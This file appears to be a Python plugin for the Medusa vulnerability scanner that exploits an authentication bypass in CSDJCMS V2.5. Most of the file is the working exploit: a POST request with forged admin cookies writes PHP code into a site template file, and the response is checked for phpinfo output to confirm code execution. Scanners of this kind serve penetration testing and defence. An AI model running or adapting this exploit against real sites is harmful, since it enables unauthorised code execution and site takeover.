#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,randoms,ErrorHandling,Proxies


class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['createDate'] = "2020-02-15"  # 插件编辑时间
        self.info['disclosure']= "2013-04-11"#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CSDJCMSGetshell1" # 插件名称
        self.info['name'] = "CSDJCMSGetshell1" #漏洞名称
        self.info['affects'] = "CSDJCMS"  # 漏洞组件
        self.info['desc_content'] = "CSDJCMSV2.5admin_loginstate.php文件中,如果s_login的值等于四个cookie相加的md5加密,即可直接通过验证"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "CSDJCMS(程氏舞曲管理系统)V2.5"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,Token,proxies=None):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload_url = scheme + "://" + url + ":" + str(port)
        referer = scheme + "://" + url
        headers = {
            "Host": "{}".format(url),
            "User-Agent": RandomAgent,
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "{}/admin/admin_t ... ;file=artindex.html".format(referer),
            "Cookie": "CS_AdminID=1; CS_AdminUserName=1; CS_AdminPassWord=1; CS_Quanx=0_1,1_1,1_2,1_3,1_4,1_5,2_1,2_2,2_3,2_4,2_5,2_6,2_7,3_1,3_2,3_3,3_4,4_1,4_2,4_3,4_4,4_5,4_6,4_7,5_1,5_2,5_3,5_4,5_5,6_1,6_2,6_3,7_1,7_2,8_1,8_2,8_3,8_4; CS_Login=a3f5f5a662e8a36525f4794856e2d0a2; PHPSESSID=48ogo025b66lkat9jtc8aecub1; CNZZDATA3755283=cnzz_eid%3D1523253931-1364956519-http%253A%252F%252Fwww.djkao.com%26ntime%3D1364956519%26cnzz_a%3D1%26retime%3D1365129491148%26sin%3D%26ltime%3D1365129491148%26rtime%3D0; bdshare_firstime=1365129335963",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "169"
        }
        data = "name=cs-bottom.php&content=%3C%3Fphp+phpinfo%28%29+%3F%3E"
        resp = requests.post(payload_url,data=data,headers=headers, proxies=proxies,timeout=6, verify=False)
        con = resp.text
        if con.find('PHP Version') != -1 and con.find('System')!=-1 and con.find('Configure Command') != -1:
            Medusa = "{}存在CSDJCMSGetshell\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名


